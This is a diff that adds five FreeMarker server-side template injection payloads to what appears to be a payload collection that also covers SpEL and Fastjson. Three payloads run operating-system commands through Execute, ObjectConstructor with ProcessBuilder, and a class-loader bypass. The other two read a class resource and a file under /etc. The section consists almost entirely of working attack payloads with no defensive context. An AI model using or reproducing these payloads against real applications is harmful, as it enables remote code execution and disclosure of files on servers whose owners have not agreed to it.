@@ -160,6 +160,58 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 ```
 
 
+
+# freemarker 表达式注入
+```
+POC1:
+
+<#assign classLoader=object?api.class.protectionDomain.classLoader> 
+<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
+<#assign field=clazz?api.getField("GSON")> 
+<#assign gson=field?api.get(null)> 
+<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
+${ex("calc")}
+
+
+POC2:
+
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}
+
+
+POC3:
+
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("open -a Calculator.app") }
+
+POC4:
+
+<#assign is=object?api.class.getResourceAsStream("/Test.class")>
+FILE:[<#list 0..999999999 as _>
+    <#assign byte=is.read()>
+    <#if byte == -1>
+        <#break>
+    </#if>
+${byte}, </#list>]
+
+
+POC5:
+
+<#assign uri=object?api.class.getResource("/").toURI()>
+<#assign input=uri?api.create("file:///etc/xxxx").toURL().openConnection()>
+<#assign is=input?api.getInputStream()>
+FILE:[<#list 0..999999999 as _>
+    <#assign byte=is.read()>
+    <#if byte == -1>
+        <#break>
+    </#if>
+${byte}, </#list>]
+
+
+```
+
+
+
+
+
 # Fastjson  Payload
 ```
 
